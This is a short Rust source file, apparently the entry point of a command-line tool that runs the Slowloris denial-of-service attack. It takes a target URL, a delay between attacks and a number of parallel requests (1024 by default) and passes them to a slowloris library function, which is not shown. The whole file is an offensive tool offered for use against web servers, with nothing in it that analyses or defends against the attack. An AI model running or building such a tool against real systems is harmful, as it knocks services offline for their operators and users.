extern crate slowloris;
extern crate clap;

use clap::{Arg, App};

fn main() {
        let matches = App::new("slowloris")
                          .version("0.2.0")
                          .author("Jan Nils Ferner <jn_ferner@hotmail.de>, Ruben Schmidmeister <ruben.schmidmeister@icloud.com>")
                          .about("The slow loris attack, now implemented in Rust!")
                          .arg(Arg::with_name("URL")
                               .help("Specifies which URL to attack")
                               .required(true))
                          .arg(Arg::with_name("timeout")
                               .short("t")
                               .long("timeout")
                               .value_name("MILLISECONDS")
                               .default_value("4500")
                               .help("Sets the amount of time to wait between attacks"))
                          .arg(Arg::with_name("requests")
                               .short("r")
                               .long("requests")
                               .value_name("NUM")
                               .default_value("1024")
                               .help("Sets the amount of parallel requests per attack"))
                          .get_matches();

    let url = matches.value_of("URL").unwrap();
    let timeout = matches.value_of("timeout").unwrap().parse::<u64>().expect("Please provide a valid number as timeout");
    let requests = matches.value_of("requests").unwrap().parse::<u64>().expect("Please provide a valid number as requests");

    slowloris::do_loris(&url, timeout, requests).unwrap();
    println!("Hello, world!");
}
